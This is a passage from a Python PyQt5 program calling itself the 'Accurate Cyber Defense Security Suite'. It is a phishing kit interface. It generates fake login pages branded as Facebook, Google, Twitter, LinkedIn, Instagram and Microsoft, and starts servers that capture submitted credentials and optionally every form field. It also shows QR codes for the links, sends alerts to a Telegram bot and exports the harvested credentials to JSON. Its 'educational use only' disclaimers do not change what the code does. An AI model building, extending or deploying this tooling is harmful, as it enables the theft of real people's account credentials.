        settings_menu.addAction(config_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        
        about_action = QAction('About', self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
    
    def create_toolbar(self):
        toolbar = QToolBar()
        self.addToolBar(toolbar)
        
        start_btn = QPushButton("🚀 Start Server")
        start_btn.clicked.connect(self.start_server)
        toolbar.addWidget(start_btn)
        
        stop_btn = QPushButton("🛑 Stop Server")
        stop_btn.clicked.connect(self.stop_server)
        toolbar.addWidget(stop_btn)
        
        toolbar.addSeparator()
        
        network_btn = QPushButton("🔧 Network Tools")
        network_btn.clicked.connect(self.show_network_tools)
        toolbar.addWidget(network_btn)
        
        toolbar.addSeparator()
        
        credentials_btn = QPushButton("👁️ View Credentials")
        credentials_btn.clicked.connect(self.show_credentials_viewer)
        toolbar.addWidget(credentials_btn)
    
    def create_dashboard_tab(self, layout):
        # Statistics frame
        stats_frame = QGroupBox("📈 Statistics")
        stats_layout = QVBoxLayout()
        stats_frame.setLayout(stats_layout)
        layout.addWidget(stats_frame)
        
        stats_grid = QHBoxLayout()
        
        self.pages_count_label = QLabel("Phishing Pages: 0")
        self.pages_count_label.setStyleSheet("font-size: 14px; font-weight: bold;")
        stats_grid.addWidget(self.pages_count_label)
        
        self.creds_count_label = QLabel("Credentials Captured: 0")
        self.creds_count_label.setStyleSheet("font-size: 14px; font-weight: bold;")
        stats_grid.addWidget(self.creds_count_label)
        
        self.telegram_count_label = QLabel("Telegram Notifications: 0")
        self.telegram_count_label.setStyleSheet("font-size: 14px; font-weight: bold;")
        stats_grid.addWidget(self.telegram_count_label)
        
        self.visitors_count_label = QLabel("Visitors: 0")
        self.visitors_count_label.setStyleSheet("font-size: 14px; font-weight: bold;")
        stats_grid.addWidget(self.visitors_count_label)
        
        stats_layout.addLayout(stats_grid)
        
        # Quick actions
        actions_frame = QGroupBox("⚡ Quick Actions")
        actions_layout = QVBoxLayout()
        actions_frame.setLayout(actions_layout)
        layout.addWidget(actions_frame)
        
        quick_actions = QHBoxLayout()
        
        test_telegram_btn = QPushButton("Test Telegram")
        test_telegram_btn.clicked.connect(self.test_telegram)
        quick_actions.addWidget(test_telegram_btn)
        
        network_tools_btn = QPushButton("Network Tools")
        network_tools_btn.clicked.connect(self.show_network_tools)
        quick_actions.addWidget(network_tools_btn)
        
        clear_data_btn = QPushButton("Clear Data")
        clear_data_btn.clicked.connect(self.clear_data)
        quick_actions.addWidget(clear_data_btn)
        
        actions_layout.addLayout(quick_actions)
        
        # System info
        sys_frame = QGroupBox("💻 System Info")
        sys_layout = QVBoxLayout()
        sys_frame.setLayout(sys_layout)
        layout.addWidget(sys_frame)
        
        self.sys_info_label = QLabel("Loading system information...")
        self.sys_info_label.setWordWrap(True)
        sys_layout.addWidget(self.sys_info_label)
        
        refresh_sys_btn = QPushButton("Refresh System Info")
        refresh_sys_btn.clicked.connect(self.update_system_info)
        sys_layout.addWidget(refresh_sys_btn)
        
        layout.addStretch()
        
        # Initial system info update
        self.update_system_info()
    
    def create_server_tab(self, layout):
        # Port configuration
        port_group = QGroupBox("Server Settings")
        port_layout = QVBoxLayout()
        port_group.setLayout(port_layout)
        layout.addWidget(port_group)
        
        port_row = QHBoxLayout()
        port_row.addWidget(QLabel("Port:"))
        self.port_input = QSpinBox()
        self.port_input.setRange(1024, 65535)
        self.port_input.setValue(8080)
        port_row.addWidget(self.port_input)
        port_layout.addLayout(port_row)
        
        # Redirect URL
        redirect_row = QHBoxLayout()
        redirect_row.addWidget(QLabel("Redirect URL:"))
        self.redirect_input = QLineEdit("https://example.com")
        redirect_row.addWidget(self.redirect_input)
        port_layout.addLayout(redirect_row)
        
        # Capture options
        self.capture_all_check = QCheckBox("Capture all form fields (not just username/password)")
        port_layout.addWidget(self.capture_all_check)
        
        # Server controls
        server_controls = QHBoxLayout()
        self.start_button = QPushButton("🚀 Start Server")
        self.start_button.clicked.connect(self.start_server)
        server_controls.addWidget(self.start_button)
        
        self.stop_button = QPushButton("🛑 Stop Server")
        self.stop_button.clicked.connect(self.stop_server)
        self.stop_button.setEnabled(False)
        server_controls.addWidget(self.stop_button)
        
        port_layout.addLayout(server_controls)
        
        # Quick page generation
        page_group = QGroupBox("Quick Page Generation")
        page_layout = QFormLayout()
        page_group.setLayout(page_layout)
        layout.addWidget(page_group)
        
        self.page_template = QComboBox()
        self.page_template.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Instagram", "Microsoft", "Custom"])
        page_layout.addRow("Template:", self.page_template)
        
        generate_btn = QPushButton("Generate Phishing Page")
        generate_btn.clicked.connect(self.generate_phishing_page)
        page_layout.addRow(generate_btn)
        
        layout.addStretch()
    
    def create_template_tab(self, layout):
        # Template selection
        template_select_row = QHBoxLayout()
        template_select_row.addWidget(QLabel("Template:"))
        self.template_select = QComboBox()
        self.template_select.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Instagram", "Microsoft", "Custom"])
        self.template_select.currentTextChanged.connect(self.change_template)
        template_select_row.addWidget(self.template_select)
        
        self.load_template_btn = QPushButton("📂 Load from File")
        self.load_template_btn.clicked.connect(self.load_template_from_file)
        template_select_row.addWidget(self.load_template_btn)
        
        self.save_template_btn = QPushButton("💾 Save to File")
        self.save_template_btn.clicked.connect(self.save_template_to_file)
        template_select_row.addWidget(self.save_template_btn)
        
        layout.addLayout(template_select_row)
        
        # Template editor
        self.template_editor = QTextEdit()
        layout.addWidget(self.template_editor)
    
    def create_network_tab(self, layout):
        # Network tools introduction
        intro_label = QLabel(
            "🔧 <b>Network Security Tools</b><br><br>"
            "This section provides various network diagnostic and security tools including:<br>"
            "• Ping testing<br>"
            "• Traceroute analysis<br>"
            "• IP location lookup<br>"
            "• System information<br>"
            "• Command history<br><br>"
            "Click the button below to open the Network Tools dialog."
        )
        intro_label.setWordWrap(True)
        layout.addWidget(intro_label)
        
        # Open network tools button
        open_tools_btn = QPushButton("🛠️ Open Network Tools")
        open_tools_btn.clicked.connect(self.show_network_tools)
        open_tools_btn.setStyleSheet("font-size: 14px; padding: 10px;")
        layout.addWidget(open_tools_btn)
        
        # Quick network commands
        quick_group = QGroupBox("Quick Network Commands")
        quick_layout = QVBoxLayout()
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        # Ping quick command
        ping_layout = QHBoxLayout()
        self.quick_ping_input = QLineEdit()
        self.quick_ping_input.setPlaceholderText("Enter IP to ping")
        ping_layout.addWidget(self.quick_ping_input)
        
        quick_ping_btn = QPushButton("Ping")
        quick_ping_btn.clicked.connect(self.quick_ping)
        ping_layout.addWidget(quick_ping_btn)
        quick_layout.addLayout(ping_layout)
        
        # Traceroute quick command
        trace_layout = QHBoxLayout()
        self.quick_trace_input = QLineEdit()
        self.quick_trace_input.setPlaceholderText("Enter IP for traceroute")
        trace_layout.addWidget(self.quick_trace_input)
        
        quick_trace_btn = QPushButton("Traceroute")
        quick_trace_btn.clicked.connect(self.quick_traceroute)
        trace_layout.addWidget(quick_trace_btn)
        quick_layout.addLayout(trace_layout)
        
        layout.addStretch()
    
    def create_telegram_tab(self, layout):
        telegram_group = QGroupBox("Telegram Bot Configuration")
        telegram_layout = QFormLayout()
        telegram_group.setLayout(telegram_layout)
        layout.addWidget(telegram_group)
        
        self.telegram_token_input = QLineEdit()
        self.telegram_token_input.setPlaceholderText("Enter your Telegram bot token")
        telegram_layout.addRow("Bot Token:", self.telegram_token_input)
        
        self.telegram_chat_id_input = QLineEdit()
        self.telegram_chat_id_input.setPlaceholderText("Enter your chat ID")
        telegram_layout.addRow("Chat ID:", self.telegram_chat_id_input)
        
        test_btn = QPushButton("Test Telegram Connection")
        test_btn.clicked.connect(self.test_telegram)
        telegram_layout.addRow(test_btn)
        
        self.telegram_status = QLabel("Status: Not configured")
        telegram_layout.addRow(self.telegram_status)
        
        layout.addStretch()
    
    def create_monitoring_panel(self, layout):
        # Server Log
        log_group = QGroupBox("📊 Server Log")
        log_layout = QVBoxLayout()
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        self.terminal_output = QPlainTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setFont(QFont("Courier New", 9))
        log_layout.addWidget(self.terminal_output)
        
        # Real-time Credentials
        creds_group = QGroupBox("🔑 Captured Credentials (Real-time)")
        creds_layout = QVBoxLayout()
        creds_group.setLayout(creds_layout)
        layout.addWidget(creds_group)
        
        self.creds_display = QPlainTextEdit()
        self.creds_display.setReadOnly(True)
        self.creds_display.setFont(QFont("Courier New", 9))
        creds_layout.addWidget(self.creds_display)
        
        # Control buttons
        button_layout = QHBoxLayout()
        
        clear_log_btn = QPushButton("🗑️ Clear Log")
        clear_log_btn.clicked.connect(lambda: self.terminal_output.clear())
        button_layout.addWidget(clear_log_btn)
        
        clear_creds_btn = QPushButton("🗑️ Clear Credentials")
        clear_creds_btn.clicked.connect(self.clear_credentials)
        button_layout.addWidget(clear_creds_btn)
        
        export_btn = QPushButton("📤 Export Credentials")
        export_btn.clicked.connect(self.export_credentials)
        button_layout.addWidget(export_btn)
        
        layout.addLayout(button_layout)
    
    def load_default_templates(self):
        self.templates = {
            "Facebook": self.get_facebook_template(),
            "Google": self.get_google_template(),
            "Twitter": self.get_twitter_template(),
            "LinkedIn": self.get_linkedin_template(),
            "Instagram": self.get_instagram_template(),
            "Microsoft": self.get_microsoft_template(),
            "Custom": self.get_default_template()
        }
        self.template_editor.setPlainText(self.templates["Facebook"])
    
    def get_default_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            outline: none;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .login-btn:hover {
            transform: translateY(-2px);
        }
        .educational-note {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 Secure Login</div>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        <div class="educational-note">
            <strong>Educational Purpose Only:</strong> This is a simulated login page for cybersecurity awareness training.
        </div>
    </div>
</body>
</html>"""
    
    def get_facebook_template(self):
        return self.get_default_template().replace("Secure Login", "Facebook - Log In").replace("🔒 Secure Login", "facebook")
    
    def get_google_template(self):
        return self.get_default_template().replace("Secure Login", "Google Account").replace("🔒 Secure Login", "Google")
    
    def get_twitter_template(self):
        return self.get_default_template().replace("Secure Login", "Twitter Login").replace("🔒 Secure Login", "Twitter")
    
    def get_linkedin_template(self):
        return self.get_default_template().replace("Secure Login", "LinkedIn Login").replace("🔒 Secure Login", "LinkedIn")
    
    def get_instagram_template(self):
        return self.get_default_template().replace("Secure Login", "Instagram Login").replace("🔒 Secure Login", "Instagram")
    
    def get_microsoft_template(self):
        return self.get_default_template().replace("Secure Login", "Microsoft Account").replace("🔒 Secure Login", "Microsoft")
    
    def change_template(self, template_name):
        if template_name in self.templates:
            self.template_editor.setPlainText(self.templates[template_name])
    
    def load_template_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    self.template_editor.setPlainText(file.read())
                self.template_select.setCurrentText("Custom")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not open file: {str(e)}")
    
    def save_template_to_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(self.template_editor.toPlainText())
                QMessageBox.information(self, "Success", "Template saved successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not save file: {str(e)}")
    
    def test_telegram(self):
        token = self.telegram_token_input.text()
        chat_id = self.telegram_chat_id_input.text()
        
        if not token or not chat_id:
            QMessageBox.warning(self, "Error", "Please enter both bot token and chat ID")
            return
        
        self.telegram_manager.configure(token, chat_id)
        
        test_msg = "🔔 <b>Accurate Cyber Defense - Test Message</b>\nThis is a test message from your security tool. Configuration is working correctly! ✅"
        success = self.telegram_manager.send_message(test_msg)
        
        if success:
            self.telegram_status.setText("Status: ✅ Connected and working")
            QMessageBox.information(self, "Success", "Telegram connection test successful!")
            self.save_telegram_settings()
        else:
            self.telegram_status.setText("Status: ❌ Connection failed")
            QMessageBox.warning(self, "Error", "Failed to send test message. Check your token and chat ID.")
    
    def save_telegram_settings(self):
        self.settings.setValue("telegram/token", self.telegram_token_input.text())
        self.settings.setValue("telegram/chat_id", self.telegram_chat_id_input.text())
    
    def load_settings(self):
        token = self.settings.value("telegram/token", "")
        chat_id = self.settings.value("telegram/chat_id", "")
        
        self.telegram_token_input.setText(token)
        self.telegram_chat_id_input.setText(chat_id)
        
        if token and chat_id:
            self.telegram_manager.configure(token, chat_id)
            self.telegram_status.setText("Status: ✅ Configured")
    
    def start_server(self):
        port = self.port_input.value()
        template = self.template_editor.toPlainText()
        redirect_url = self.redirect_input.text()
        capture_all = self.capture_all_check.isChecked()
        
        if not template:
            QMessageBox.warning(self, "Error", "Template cannot be empty")
            return
        
        try:
            # Stop existing server if running
            if str(port) in self.phishing_servers:
                server = self.phishing_servers[str(port)]
                if server.running:
                    server.stop()
                    server.wait()
            
            # Start new server
            server = PhishingServer(port, template, redirect_url, capture_all, self.telegram_manager)
            server.new_credentials.connect(self.handle_new_credentials)
            server.server_status.connect(self.handle_server_status)
            server.telegram_status.connect(self.handle_telegram_status)
            server.visitor_connected.connect(self.handle_visitor)
            server.start()
            
            self.phishing_servers[str(port)] = server
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)
            
            phishing_link = f"http://localhost:{port}"
            self.terminal_output.appendPlainText(f"🎯 Main phishing server started: {phishing_link}")
            self.status_bar.showMessage(f"Main server running on port {port}")
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not start server: {str(e)}")
    
    def stop_server(self):
        port = self.port_input.value()
        if str(port) in self.phishing_servers:
            server = self.phishing_servers[str(port)]
            server.stop()
            server.wait()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.terminal_output.appendPlainText("🛑 Main server stopped")
            self.status_bar.showMessage("Main server stopped")
    
    def generate_phishing_page(self):
        template_name = self.page_template.currentText()
        redirect_url = self.redirect_input.text()
        port = random.randint(8000, 9000)  # Random port for quick generation
        
        # Generate unique page ID
        page_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        
        # Get template
        if template_name in self.templates:
            template = self.templates[template_name]
        else:
            template = self.templates["Custom"]
        
        # Start dedicated server for this page
        try:
            server = PhishingServer(port, template, redirect_url, True, self.telegram_manager, page_id)
            server.new_credentials.connect(self.handle_new_credentials)
            server.server_status.connect(self.handle_server_status)
            server.telegram_status.connect(self.handle_telegram_status)
            server.visitor_connected.connect(self.handle_visitor)
            server.start()
            
            self.phishing_servers[page_id] = server
            
            # Store page info
            page_info = {
                'id': page_id,
                'template': template_name,
                'redirect_url': redirect_url,
                'port': port,
                'url': f"http://localhost:{port}",
                'created_at': datetime.now().isoformat()
            }
            self.phishing_pages[page_id] = page_info
            
            # Update UI
            self.stats['pages_created'] += 1
            self.update_stats()
            
            self.terminal_output.appendPlainText(f"📄 Generated phishing page: {page_info['url']} (ID: {page_id})")
            
            # Show QR code
            self.show_qr_code(page_info['url'])
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not generate phishing page: {str(e)}")
    
    def show_qr_code(self, url):
        dialog = QRCodeDialog(url, self)
        dialog.exec_()
    
    def show_network_tools(self):
        dialog = NetworkToolsDialog(self)
        dialog.exec_()
    
    def quick_ping(self):
        target = self.quick_ping_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP or hostname")
            return
        
        self.db_manager.log_command(f"ping {target}", "quick_tools")
        self.terminal_output.appendPlainText(f"Pinging {target}...\n")
        
        def do_ping():
            result = self.scanner.ping_ip(target)
            self.terminal_output.appendPlainText(result)
            self.terminal_output.appendPlainText("-" * 50)
        
        threading.Thread(target=do_ping, daemon=True).start()
    
    def quick_traceroute(self):
        target = self.quick_trace_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP or hostname")
            return
        
        self.db_manager.log_command(f"traceroute {target}", "quick_tools")
        self.terminal_output.appendPlainText(f"Traceroute to {target}...\n")
        
        def do_trace():
            result = self.scanner.traceroute(target)
            self.terminal_output.appendPlainText(result)
            self.terminal_output.appendPlainText("-" * 50)
        
        threading.Thread(target=do_trace, daemon=True).start()
    
    def update_system_info(self):
        info = "💻 System Information\n\n"
        info += f"OS: {platform.system()} {platform.release()}\n"
        info += f"CPU Cores: {psutil.cpu_count()}\n"
        info += f"CPU Usage: {psutil.cpu_percent()}%\n"
        
        mem = psutil.virtual_memory()
        info += f"Memory: {mem.percent}% used\n"
        
        disk = psutil.disk_usage('/')
        info += f"Disk: {disk.percent}% used\n"
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            info += f"Hostname: {hostname}\n"
            info += f"Local IP: {local_ip}\n"
        except:
            info += "Hostname: Unable to determine\n"
        
        self.sys_info_label.setText(info)
    
    def handle_new_credentials(self, log_entry, cred_data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cred_data['timestamp'] = timestamp
        self.captured_credentials.append(cred_data)
        
        self.creds_display.appendPlainText(log_entry)
        self.stats['credentials_captured'] += 1
        self.update_stats()
        
        self.status_bar.showMessage(f"New credentials captured! Total: {self.stats['credentials_captured']}")
    
    def handle_server_status(self, status):
        self.terminal_output.appendPlainText(f"📡 {status}")
    
    def handle_telegram_status(self, success, message):
        if success:
            self.terminal_output.appendPlainText(f"📱 ✅ {message}")
            self.stats['telegram_notifications'] += 1
            self.update_stats()
        else:
            self.terminal_output.appendPlainText(f"📱 ❌ {message}")
    
    def handle_visitor(self, client_info):
        self.terminal_output.appendPlainText(f"👤 {client_info}")
        self.stats['visitors'] += 1
        self.update_stats()
    
    def update_stats(self):
        self.pages_count_label.setText(f"Phishing Pages: {self.stats['pages_created']}")
        self.creds_count_label.setText(f"Credentials Captured: {self.stats['credentials_captured']}")
        self.telegram_count_label.setText(f"Telegram Notifications: {self.stats['telegram_notifications']}")
        self.visitors_count_label.setText(f"Visitors: {self.stats['visitors']}")
    
    def clear_credentials(self):
        self.captured_credentials.clear()
        self.creds_display.clear()
        self.stats['credentials_captured'] = 0
        self.update_stats()
    
    def export_credentials(self):
        if not self.captured_credentials:
            QMessageBox.information(self, "Export", "No credentials to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Export Credentials", "credentials.json", "JSON Files (*.json)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    json.dump(self.captured_credentials, file, indent=2)
                QMessageBox.information(self, "Success", "Credentials exported successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not export credentials: {str(e)}")
    
    def export_data(self):
        data = {
            'stats': self.stats,
            'phishing_pages': self.phishing_pages,
            'credentials': self.captured_credentials,
            'exported_at': datetime.now().isoformat()
        }
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Export All Data", "security_data.json", "JSON Files (*.json)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    json.dump(data, file, indent=2)
                QMessageBox.information(self, "Success", "All data exported successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not export data: {str(e)}")
    
    def clear_data(self):
        reply = QMessageBox.question(self, "Confirm Clear", 
                                   "Are you sure you want to clear all data? This cannot be undone.",
                                   QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.captured_credentials.clear()
            self.phishing_pages.clear()
            self.stats = {'pages_created': 0, 'credentials_captured': 0, 'telegram_notifications': 0, 'visitors': 0, 'network_scans': 0}
            
            # Stop all servers
            for server in self.phishing_servers.values():
                if server.running:
                    server.stop()
                    server.wait()
            self.phishing_servers.clear()
            
            # Clear UI
            self.creds_display.clear()
            self.terminal_output.clear()
            self.update_stats()
            
            self.terminal_output.appendPlainText("🗑️ All data cleared")
    
    def show_credentials_viewer(self):
        if not self.captured_credentials:
            QMessageBox.information(self, "Credentials", "No credentials captured yet")
            return
        
        # Simple credentials viewer
        viewer = QDialog(self)
        viewer.setWindowTitle("Captured Credentials")
        viewer.resize(600, 400)
        
        layout = QVBoxLayout()
        viewer.setLayout(layout)
        
        text_edit = QPlainTextEdit()
        text_edit.setReadOnly(True)
        text_edit.setFont(QFont("Courier New", 9))
        
        text = "🔑 Captured Credentials\n\n"
        for cred in self.captured_credentials:
            text += f"Time: {cred.get('timestamp', 'Unknown')}\n"
            text += f"IP: {cred.get('client_ip', 'Unknown')}\n"
            for key, value in cred.items():
                if key not in ['timestamp', 'client_ip', 'user_agent']:
                    text += f"{key}: {value}\n"
            text += "-" * 40 + "\n"
        
        text_edit.setPlainText(text)
        layout.addWidget(text_edit)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok)
        button_box.accepted.connect(viewer.accept)
        layout.addWidget(button_box)
        
        viewer.exec_()
    
    def show_settings(self):
        dialog = SettingsDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            dialog.save_settings()
            self.load_settings()
    
    def show_about(self):
        QMessageBox.about(self, "About Accurate Cyber Defense Security Suite",
            "<h3>Accurate Cyber Defense - Advanced Security Suite</h3>"
            "<p><b>Version:</b> 4.0</p>"
            "<p><b>Purpose:</b> Educational and authorized security awareness training only</p>"
            "<p><b>Features:</b></p>"
            "<ul>"
            "<li>Phishing awareness training</li>"
            "<li>Network security tools</li>"
            "<li>Real-time monitoring</li>"
            "<li>Telegram notifications</li>"
            "<li>Multiple themes</li>"
            "<li>Comprehensive reporting</li>"
            "</ul>"
            "<p><b>⚠️ Warning:</b> This tool should only be used for educational purposes and authorized penetration testing. "
            "Unauthorized use is illegal and unethical.</p>"
            "<p><b>🔒 Use Responsibly:</b> Always obtain proper authorization before testing.</p>")
    
    def closeEvent(self, event):
        # Stop all servers
        for server in self.phishing_servers.values():
            if server.running:
                server.stop()
                server.wait()
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Accurate Cyber Defense Security Suite")
    app.setApplicationVersion("4.0")
    app.setOrganizationName("Accurate Cyber Defense")
    
    # Display educational disclaimer
    reply = QMessageBox.question(None, "⚠️ EDUCATIONAL USE ONLY ⚠️", 
        "ACCURATE CYBER DEFENSE - SECURITY SUITE\n\n"
        "This tool is designed for:\n"
        "• Security education and awareness training\n"
        "• Authorized penetration testing\n"
        "• Cybersecurity research and development\n\n"
        "⚠️ LEGAL AND ETHICAL USE ONLY ⚠️\n"
        "• Never use without explicit authorization\n"
        "• Respect privacy and applicable laws\n"
        "• Use only on systems you own or have permission to test\n\n"
        "By clicking 'Yes', you confirm you have proper authorization\n"
        "and understand the legal and ethical implications.",
        QMessageBox.Yes | QMessageBox.No,
        QMessageBox.No)
    
    if reply != QMessageBox.Yes:
        sys.exit(0)
    
    # Create and show main window
    window = AdvancedCyberSecurityTool()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()